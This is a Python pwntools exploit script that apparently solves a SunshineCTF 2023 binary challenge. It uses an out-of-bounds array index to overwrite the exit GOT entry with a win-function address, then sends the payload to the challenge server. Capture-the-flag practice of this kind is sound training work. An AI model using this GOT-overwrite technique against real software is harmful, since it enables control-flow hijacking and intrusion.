from pwn import *

context.log_level = 'debug'

if args.REMOTE:
    # nc chal.2023.sunshinectf.games 23003
    io = remote('chal.2023.sunshinectf.games', 23003)
else:
    io = process('./sunshine')

fruits_address = 0x405080
exit_sym_address = 0x405040

idx = (exit_sym_address - fruits_address) // 8

win_address = 0x40128f

io.sendlineafter(b'>>> ', str(idx).encode('utf-8'))

payload = p64(win_address)

with open('payload', 'wb') as f:
    f.write(payload)

io.sendlineafter(b'>>>', payload)

print(io.recvline())
